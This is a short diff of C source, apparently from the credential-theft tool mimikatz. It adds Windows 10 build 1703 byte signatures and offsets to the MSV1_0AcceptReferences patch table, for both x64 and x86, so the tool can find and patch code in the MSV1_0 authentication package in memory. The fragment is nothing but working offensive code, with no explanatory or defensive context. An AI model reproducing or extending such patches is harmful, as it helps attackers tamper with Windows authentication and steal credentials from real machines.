@@ -482,19 +482,21 @@ KULL_M_PATCH_GENERIC MSV1_0AcceptReferences[] = {
 	{KULL_M_WIN_MIN_BUILD_2K3,	{sizeof(PTRN_WIN5_MSV1_0),	PTRN_WIN5_MSV1_0},	{0, NULL}, {  0, sizeof(PTRN_WIN5_MSV1_0)}},
 	{KULL_M_WIN_MIN_BUILD_VISTA,{sizeof(PTRN_WI6X_MSV1_0),	PTRN_WI6X_MSV1_0},	{0, NULL}, {-15, 15}},
 	{KULL_M_WIN_MIN_BUILD_8,	{sizeof(PTRN_WI81_MSV1_0),	PTRN_WI81_MSV1_0},	{0, NULL}, {-17, 15}},
+	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WI81_MSV1_0),	PTRN_WI81_MSV1_0},	{0, NULL}, {-16, 15}},
 };
 #elif defined _M_IX86
 BYTE INSTR_JMP[]= {0xe9}; // need 5
 BYTE PTRN_WIN5_MSV1_0[] = {0x8b, 0xff, 0x55, 0x8b, 0xec, 0xff, 0x75, 0x14, 0xff, 0x75, 0x10, 0xff, 0x75, 0x08, 0xe8};
 BYTE PTRN_WI6X_MSV1_0[]	= {0xff, 0x75, 0x14, 0xff, 0x75, 0x10, 0xff, 0x75, 0x08, 0xe8, 0x24, 0x00, 0x00, 0x00};
 BYTE PTRN_WI80_MSV1_0[] = {0xff, 0x75, 0x08, 0x8b, 0x4d, 0x14, 0x8b, 0x55, 0x10, 0xe8};
-BYTE PTRN_WI81_MSV1_0[]	= {0xff, 0x75, 0x14, 0x8B, 0x55, 0x10, 0x8B, 0x4D, 0x08, 0xE8};
-
+BYTE PTRN_WI81_MSV1_0[]	= {0xff, 0x75, 0x14, 0x8b, 0x55, 0x10, 0x8b, 0x4d, 0x08, 0xe8};
+BYTE PTRN_W10_1703_MSV1_0[] = {0x8b, 0x55, 0x10, 0x8b, 0x4d, 0x08, 0x56, 0xff, 0x75, 0x14, 0xe8};
 KULL_M_PATCH_GENERIC MSV1_0AcceptReferences[] = {
 	{KULL_M_WIN_MIN_BUILD_XP,	{sizeof(PTRN_WIN5_MSV1_0),	PTRN_WIN5_MSV1_0},	{0, NULL}, {  0, 5}},
 	{KULL_M_WIN_MIN_BUILD_VISTA,{sizeof(PTRN_WI6X_MSV1_0),	PTRN_WI6X_MSV1_0},	{0, NULL}, {-41, 5}},
 	{KULL_M_WIN_MIN_BUILD_8,	{sizeof(PTRN_WI80_MSV1_0),	PTRN_WI80_MSV1_0},	{0, NULL}, {-43, 5}},
 	{KULL_M_WIN_MIN_BUILD_BLUE,	{sizeof(PTRN_WI81_MSV1_0),	PTRN_WI81_MSV1_0},	{0, NULL}, {-39, 5}},
+	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_W10_1703_MSV1_0),	PTRN_W10_1703_MSV1_0},	{0, NULL}, {-28, 15}},
 };
 #endif
 PCWCHAR szMsvCrt = L"msvcrt.dll";
